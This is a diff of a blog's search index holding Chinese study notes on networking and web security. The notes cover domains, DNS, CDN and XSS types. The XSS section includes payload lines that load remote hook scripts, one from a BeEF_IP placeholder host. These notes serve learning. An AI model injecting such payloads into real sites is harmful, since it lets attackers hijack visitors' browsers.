@@ -1,6 +1,23 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>网安篇（1）</title>
+    <url>/2022/10/01/%E7%BD%91%E5%AE%89%E7%AF%87%EF%BC%881%EF%BC%89/</url>
+    <content><![CDATA[<h5 id="域名："><a href="#域名：" class="headerlink" title="域名："></a>域名：</h5><p>顶级域名，又称一级域名，常见的有”.com”、”.org”、”.net”、”.cn”等<br><a href="http://baidu.com/">http://baidu.com</a> 一级域名<br>二级域名<br>bbs.baidu .com 二级域名<br>tieba.baidu .com 二级域名<br>多级域名：<br><strong>.</strong>.__.com</p>
+<span id="more"></span>
+<p>顶级域名：<br>com 商业机构<br>edu 教育及研究机构<br>firm 公司企业<br>gov 政府机构<br>info 信息服务<br>net 网络服务机构<br>nom 个人<br>org 专业团体<br>rec 娱乐类机构<br>store 销售类公司企业<br>web 从事WWW活动的机构</p>
+<h5 id="DNS是什么："><a href="#DNS是什么：" class="headerlink" title="DNS是什么："></a>DNS是什么：</h5><p>DNS是域名系统,Domain Name System的缩写,服务域名系统为Internet上的主机分配域名地址和IP地址。用户使用域名地址，该系统就会自动把域名地址转为IP地址。域名服务是运行域名系统的Internet工具。执行域名服务的服务器称之为DNS服务器，通过DNS服务器来应答域名服务的查询。<br>DNS就是把域名解析为IP地址，提供我们上网，我们能够上网最终是找到IP地址。<br>比如，<a href="http://xxxx.com是域名,那么他的ip地址假设是144.144.144.144,我们用浏览器访问该的网页,先到dns服务器找http//xxxx.com%E5%AF%B9%E5%BA%94%E7%9A%84IP%E5%9C%B0%E5%9D%80%EF%BC%8C%E7%84%B6%E5%90%8E%E9%80%9A%E8%BF%87IP%E5%9C%B0%E5%9D%80%E8%BF%9B%E8%A1%8C%E8%AE%BF%E9%97%AE%E3%80%82">http://xxxx.com是域名，那么他的IP地址假设是144.144.144.144，我们用浏览器访问该的网页，先到DNS服务器找http://xxxx.com对应的IP地址，然后通过IP地址进行访问。</a><br>域名系统为Internet上的主机分配域名地址和IP地址。用户使用域名地址，该系统就会自动把域名地址转为IP地址。域名服务是运行域名系统的Internet工具。执行域名服务的服务器称之为DNS服务器，通过DNS服务器来应答域名服务的查询。<br>DNS服务器地址:<br>域名解释服务器,打比方,当你在地址栏输入 <a href="http://www.dns.com/">www.dns.com</a> 时,电脑不是直接就连接到百度的服务器里的,而是先向这个DNS服务器查询<a href="http://www.dns.com的ip地址,然后再按照这个ip地址转到百度的服务器里.一般都是每个地区有一个特定的dns服务器的,由isp提供的/">www.dns.com的IP地址,然后再按照这个IP地址转到百度的服务器里.一般都是每个地区有一个特定的DNS服务器的,由ISP提供的</a>.<br>由于ISP的拨号服务器一般都有缺省的DNS，所以你可以不用设置DNS，如果你需要指定一台DNS，你一定要了解这台DNS的准确IP（比如福州的163用户的DNS为202.101.98.55）。DNS设置方法如下：在“控制面板”下打开“网络”里的“TCP/IP”的“属性”，在“DNS设置”栏目选择“启用DNS”，并将DNS的IP地址添加即可。<br>IP192.168.X.X一般都是带有路由的IP，网关默认最后1位肯定是1，子网掩码 255.255.255.0简单说C类的IP，子网都可以这样设置<br>我的理解：DNS服务器地址就是将人们可以理解的域名解析成计算机可以获取的二进制语言（也就是这个域名实际所代表的IP地址）</p>
+<h5 id="什么是CDN："><a href="#什么是CDN：" class="headerlink" title="什么是CDN："></a>什么是CDN：</h5><p>cdn全称是内容分发网络。其目的是让用户能够更快速的得到请求的数据。简单来讲，cdn就是用来加速的，他能让用户就近访问数据，这样就更更快的获取到需要的数据。举个例子，现在服务器在北京，深圳的用户想要获取服务器上的数据就需要跨越一个很远的距离，这显然就比北京的用户访问北京的服务器速度要慢。但是现在我们在深圳建立一个cdn服务器，上面缓存住一些数据，深圳用户访问时先访问这个cdn服务器，如果服务器上有用户请求的数据就可以直接返回，这样速度就大大的提升了<br>CDN与DNS的关系：<br>dns与cdn的关系<br>刚才说到cdn实际上是一个就近访问，那么现在有一个问题是，我们怎么知道用户的所在位置从而给他分配最佳的cdn节点呢。这就需要dns服务来进行定位了。当我们通过使用dns服务的时候，可以根据他使用的LDNS服务器来进行一个定位，例如我们的调度服务器看到他是来自深圳电信的LDNS服务器，那么我们就认为该用户来自深圳电信，然后调度服务器可以让该用户去访问深圳电信的CDN服务器，这样就让用户访问到了最优的cdn节点。<br>通过dns服务我们可以很快的定位到用户的位置，然后给用户分配最佳cdn节点，但是这种调度方式存在一个问题，例如，当我 是北京联通的用户但是使用的却是深圳电信的ldns的话，调度服务器会给我分配到深圳电信的cdn服务器，这样就产生了错误的调度。</p>
+<h5 id="网站程序产生漏洞："><a href="#网站程序产生漏洞：" class="headerlink" title="网站程序产生漏洞："></a>网站程序产生漏洞：</h5><p>SQL注入，文件上传，xss，代码执行，变量覆盖，逻辑漏洞，反序列化。</p>
+]]></content>
+      <categories>
+        <category>——网络安全</category>
+      </categories>
+      <tags>
+        <tag>——web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>网安篇（3）</title>
     <url>/2022/10/02/%E7%BD%91%E5%AE%89%E7%AF%87%EF%BC%883%EF%BC%89/</url>
     <content><![CDATA[<h4 id="思考总结"><a href="#思考总结" class="headerlink" title="思考总结"></a>思考总结</h4><h5 id="xss主要分类："><a href="#xss主要分类：" class="headerlink" title="xss主要分类："></a>xss主要分类：</h5><p>反射型xss攻击（Reflected XSS） ：又称为非持久性跨站点脚本攻击，它是最常见的类型的XSS。漏洞产生的原因是攻<br>击者注入的数据反映在响应中。一个典型的非持久性XSS包含一个带XSS攻击向量的链接(即每次攻击需要用户的点击)。<br>存储型XSS（Stored XSS) ：又称为持久型跨站点脚本，它一般发生在XSS攻击向量(一般指XSS攻击代码)存储在网站数据 库，当一个页面被用户打开的时候执行。每当用户打开浏览器，脚本执行。持久的XSS相比非持久性XSS攻击危害性更大, 因为每当用户打开页面，查看内容时脚本将自动执行。</p>
@@ -13,23 +30,6 @@
 
 <p>这里结合了一些社工的思路，例如，通过网站内部私信的方式将其发给其他用户。如果其他用户点击并且相信了这个信 息，则可能在另外的站点重新登录账户（克隆网站收集账户） </p>
 <h6 id="访问恶意代码"><a href="#访问恶意代码" class="headerlink" title="访问恶意代码"></a>访问恶意代码</h6><p>&lt;scri.pt src=”<a href="http://www.qfedu.com/xss.js&quot;&gt;">http://www.qfedu.com/xss.js&quot;&gt;</a><br>&lt;scri.pt src=”<a href="http://beef_ip:3000/hook.js&quot;&gt;">http://BeEF_IP:3000/hook.js&quot;&gt;</a></p>
-]]></content>
-      <categories>
-        <category>——网络安全</category>
-      </categories>
-      <tags>
-        <tag>——web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>网安篇（1）</title>
-    <url>/2022/10/01/%E7%BD%91%E5%AE%89%E7%AF%87%EF%BC%881%EF%BC%89/</url>
-    <content><![CDATA[<h5 id="域名："><a href="#域名：" class="headerlink" title="域名："></a>域名：</h5><p>顶级域名，又称一级域名，常见的有”.com”、”.org”、”.net”、”.cn”等<br><a href="http://baidu.com/">http://baidu.com</a> 一级域名<br>二级域名<br>bbs.baidu .com 二级域名<br>tieba.baidu .com 二级域名<br>多级域名：<br><strong>.</strong>.__.com</p>
-<span id="more"></span>
-<p>顶级域名：<br>com 商业机构<br>edu 教育及研究机构<br>firm 公司企业<br>gov 政府机构<br>info 信息服务<br>net 网络服务机构<br>nom 个人<br>org 专业团体<br>rec 娱乐类机构<br>store 销售类公司企业<br>web 从事WWW活动的机构</p>
-<h5 id="DNS是什么："><a href="#DNS是什么：" class="headerlink" title="DNS是什么："></a>DNS是什么：</h5><p>DNS是域名系统,Domain Name System的缩写,服务域名系统为Internet上的主机分配域名地址和IP地址。用户使用域名地址，该系统就会自动把域名地址转为IP地址。域名服务是运行域名系统的Internet工具。执行域名服务的服务器称之为DNS服务器，通过DNS服务器来应答域名服务的查询。<br>DNS就是把域名解析为IP地址，提供我们上网，我们能够上网最终是找到IP地址。<br>比如，<a href="http://xxxx.com是域名,那么他的ip地址假设是144.144.144.144,我们用浏览器访问该的网页,先到dns服务器找http//xxxx.com%E5%AF%B9%E5%BA%94%E7%9A%84IP%E5%9C%B0%E5%9D%80%EF%BC%8C%E7%84%B6%E5%90%8E%E9%80%9A%E8%BF%87IP%E5%9C%B0%E5%9D%80%E8%BF%9B%E8%A1%8C%E8%AE%BF%E9%97%AE%E3%80%82">http://xxxx.com是域名，那么他的IP地址假设是144.144.144.144，我们用浏览器访问该的网页，先到DNS服务器找http://xxxx.com对应的IP地址，然后通过IP地址进行访问。</a><br>域名系统为Internet上的主机分配域名地址和IP地址。用户使用域名地址，该系统就会自动把域名地址转为IP地址。域名服务是运行域名系统的Internet工具。执行域名服务的服务器称之为DNS服务器，通过DNS服务器来应答域名服务的查询。<br>DNS服务器地址:<br>域名解释服务器,打比方,当你在地址栏输入 <a href="http://www.dns.com/">www.dns.com</a> 时,电脑不是直接就连接到百度的服务器里的,而是先向这个DNS服务器查询<a href="http://www.dns.com的ip地址,然后再按照这个ip地址转到百度的服务器里.一般都是每个地区有一个特定的dns服务器的,由isp提供的/">www.dns.com的IP地址,然后再按照这个IP地址转到百度的服务器里.一般都是每个地区有一个特定的DNS服务器的,由ISP提供的</a>.<br>由于ISP的拨号服务器一般都有缺省的DNS，所以你可以不用设置DNS，如果你需要指定一台DNS，你一定要了解这台DNS的准确IP（比如福州的163用户的DNS为202.101.98.55）。DNS设置方法如下：在“控制面板”下打开“网络”里的“TCP/IP”的“属性”，在“DNS设置”栏目选择“启用DNS”，并将DNS的IP地址添加即可。<br>IP192.168.X.X一般都是带有路由的IP，网关默认最后1位肯定是1，子网掩码 255.255.255.0简单说C类的IP，子网都可以这样设置<br>我的理解：DNS服务器地址就是将人们可以理解的域名解析成计算机可以获取的二进制语言（也就是这个域名实际所代表的IP地址）</p>
-<h5 id="什么是CDN："><a href="#什么是CDN：" class="headerlink" title="什么是CDN："></a>什么是CDN：</h5><p>cdn全称是内容分发网络。其目的是让用户能够更快速的得到请求的数据。简单来讲，cdn就是用来加速的，他能让用户就近访问数据，这样就更更快的获取到需要的数据。举个例子，现在服务器在北京，深圳的用户想要获取服务器上的数据就需要跨越一个很远的距离，这显然就比北京的用户访问北京的服务器速度要慢。但是现在我们在深圳建立一个cdn服务器，上面缓存住一些数据，深圳用户访问时先访问这个cdn服务器，如果服务器上有用户请求的数据就可以直接返回，这样速度就大大的提升了<br>CDN与DNS的关系：<br>dns与cdn的关系<br>刚才说到cdn实际上是一个就近访问，那么现在有一个问题是，我们怎么知道用户的所在位置从而给他分配最佳的cdn节点呢。这就需要dns服务来进行定位了。当我们通过使用dns服务的时候，可以根据他使用的LDNS服务器来进行一个定位，例如我们的调度服务器看到他是来自深圳电信的LDNS服务器，那么我们就认为该用户来自深圳电信，然后调度服务器可以让该用户去访问深圳电信的CDN服务器，这样就让用户访问到了最优的cdn节点。<br>通过dns服务我们可以很快的定位到用户的位置，然后给用户分配最佳cdn节点，但是这种调度方式存在一个问题，例如，当我 是北京联通的用户但是使用的却是深圳电信的ldns的话，调度服务器会给我分配到深圳电信的cdn服务器，这样就产生了错误的调度。</p>
-<h5 id="网站程序产生漏洞："><a href="#网站程序产生漏洞：" class="headerlink" title="网站程序产生漏洞："></a>网站程序产生漏洞：</h5><p>SQL注入，文件上传，xss，代码执行，变量覆盖，逻辑漏洞，反序列化。</p>
 ]]></content>
       <categories>
         <category>——网络安全</category>
